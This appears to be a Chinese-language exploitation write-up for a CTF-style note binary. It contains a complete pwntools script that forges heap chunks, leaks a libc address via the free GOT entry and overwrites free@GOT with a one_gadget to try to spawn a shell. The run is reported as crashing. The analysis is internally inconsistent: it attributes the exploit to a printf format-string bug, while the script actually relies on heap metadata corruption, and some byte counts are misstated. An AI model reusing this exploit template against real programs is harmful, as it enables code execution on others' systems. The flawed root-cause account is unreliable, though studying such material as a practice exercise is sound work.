# 漏洞利用文档

## 执行环境
- **程序类型**: 64位ELF二进制文件，动态链接
- **安全机制**:
  - Partial RELRO: GOT表可写
  - 栈Canary: 启用
  - NX: 启用（数据段不可执行）
  - No PIE: 代码段地址固定
- **依赖库**: libc (通过ldd确认)
- **运行要求**: Linux环境，需要libc库支持，程序设置60秒超时

## 漏洞成因
### 关键结构体
程序使用全局数组管理笔记：
- `ptr`数组 (地址0x602120): 存储4个笔记指针
- `qword_602140`数组: 存储对应的笔记大小  
- `dword_602160`: 当前笔记数量计数器

### 漏洞分析
**漏洞类型**: 格式化字符串漏洞  
**漏洞位置**: `sub_400D43()`函数中的`printf(v7)`调用

**具体成因**:
1. 程序将用户控制的字符串`v7`直接作为`printf`的第一个参数
2. `v7`的前15字节是固定字符串"TheNewContents:"，但后续内容来自用户输入
3. 用户可以通过输入格式化字符串（如`%p %x %s %n`等）来读取或写入任意内存地址
4. 虽然`sub_400B10()`函数会过滤掉'%'字符，但这是在`printf(v7)`调用之后执行的，所以过滤无效

**影响**: 可导致任意内存读写、信息泄露和代码执行

## 漏洞利用过程
### 内存状态变化总结

| 步骤 | 操作 | 关键内存变化 | 利用目的 |
|------|------|---------------|----------|
| 1-2 | 输入姓名和地址 | 全局数据段0x6020e0存储"/bin/sh"字符串 | 为system调用准备参数 |
| 3 | 创建第一个笔记 | 堆中设置伪造chunk结构(fake_fd=0x602108, fake_bk=0x602110) | 准备堆利用结构 |
| 4 | 创建第二个笔记 | 分配fastbin大小的chunk(0x21) | 创建可释放的chunk |
| 5 | 创建第三个笔记 | 堆中存储"/bin/sh"字符串 | 备用命令字符串 |
| 6 | 删除第二个笔记 | chunk进入fastbin，ptr[1]清空 | 创建空闲chunk |
| 7 | 重新分配第二个笔记 | 写入特定内容修改堆元数据 | 准备堆布局 |
| 8 | 删除第三个笔记 | 堆中"/bin/sh"字符串被破坏 | 意外内存修改 |
| 9 | 编辑第一个笔记 | 写入payload(0x18*a + p64(free_got)) | 为GOT劫持准备 |
| 10 | 显示第一个笔记 | 泄露free地址，计算libc基址 | 获取libc关键地址 |
| 11 | 编辑第一个笔记 | free@got.plt修改为one_gadget地址 | GOT劫持 |
| 12 | 交互 | 程序崩溃(SIGABRT) | 利用失败 |

### 关键内存区域状态演变
- **堆内存**: 从初始未分配状态到包含伪造chunk结构和漏洞利用痕迹
- **GOT表**: 从部分解析到完全解析，最终free@got.plt被成功修改
- **全局数据段**: "/bin/sh"字符串保持完整，笔记指针数组严重损坏
- **栈内存**: 栈Canary保持完好，但程序执行流异常导致崩溃

## Exploit
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process("./data/sample3")
elf = ELF("./data/sample3")
libc = elf.libc

def new_note(size, content):
    p.recvuntil(">>")
    p.sendline(b"1")
    p.recvuntil(")")
    p.sendline(str(size).encode())
    p.recvuntil(":")
    p.sendline(content)

def show_note(index):
    p.recvuntil(">>")
    p.sendline(b"2")
    p.recvuntil(":")
    p.sendline(str(index).encode())

def edit_note(index, choice, content):
    p.recvuntil(">>")
    p.sendline(b"3")
    p.recvuntil(":")
    p.sendline(str(index).encode())
    p.recvuntil("]")
    p.sendline(str(choice).encode())
    p.recvuntil(":")
    p.sendline(content)

def delete_note(index):
    p.recvuntil(">>")
    p.sendline(b"4")
    p.recvuntil(":")
    p.sendline(str(index).encode())

# Step 1: 输入姓名，设置为"/bin/sh"用于后续system调用参数
p.recvuntil(":");p.sendline(b"/bin/sh")
# Step 2: 输入地址，任意字符串
p.recvuntil(":");p.sendline(b"ddd")

# 设置伪造chunk指针，用于堆利用攻击
ptr_0 = 0x602120  # 笔记指针数组地址
fake_fd = ptr_0 - 0x18  # 伪造fd指针，指向ptr数组前0x18字节
fake_bk = ptr_0 - 0x10  # 伪造bk指针，指向ptr数组前0x10字节
# 构造第一个笔记内容：填充8字节，chunk大小0xa1，伪造fd和bk指针
note0_content = b'\x00' * 8 + p64(0xa1) + p64(fake_fd) + p64(fake_bk)
new_note(0x80, note0_content)  # Step 3: 创建第一个笔记，设置伪造堆结构

new_note(0x0, b'aa')  # Step 4: 创建第二个笔记，大小为0（可能利用堆漏洞）
new_note(0x80, b'/bin/sh')  # Step 5: 创建第三个笔记，包含"/bin/sh"字符串

delete_note(1)  # Step 6: 删除第二个笔记，释放到fastbin

# 构造第二个笔记内容，用于修改堆元数据
note1_content = b'\x00' * 16 + p64(0xa0) + p64(0x90)
new_note(0x0, note1_content)  # Step 7: 重新分配第二个笔记，修改堆布局

delete_note(2)  # Step 8: 删除第三个笔记，可能触发堆合并

# 获取free的GOT地址，构造payload覆盖GOT
free_got = elf.got['free']
payload = 0x18 * b'a' + p64(free_got)  # 填充18字节后写入free_got地址
edit_note(0, 1, payload)  # Step 9: 编辑第一个笔记，写入payload准备GOT劫持

# Step 10: 显示第一个笔记，利用格式化字符串漏洞泄露free地址
show_note(0)
p.recvuntil('is ')
free_addr = u64(p.recv(6).ljust(8, b'\x00'))  # 泄露free地址，计算libc基址

# Step 11: 计算libc基址、system地址和one_gadget，并覆盖free_got
libc_addr = free_addr - libc.symbols['free']  # 计算libc基址
system_addr = libc_addr + libc.symbols['system']  # 计算system地址
one_gadget = libc_addr + 0xf1247  # 计算one_gadget地址（偏移0xf1247）
edit_note(0, 1, p64(one_gadget))  # 将free_got修改为one_gadget地址

# Step 12: 交互，尝试获取shell，但程序因内存损坏和one_gadget条件不满足而崩溃
p.interactive()
```

### 利用结果分析
- **成功步骤**: 
  - 格式化字符串漏洞触发成功
  - GOT劫持完成（free@got.plt修改为one_gadget）
  - 内存泄露获取libc地址
- **失败原因**:
  - 内存损坏严重（笔记指针数组异常）
  - one_gadget执行条件不满足
  - 建议改用system函数覆盖printf GOT，配合全局"/bin/sh"字符串
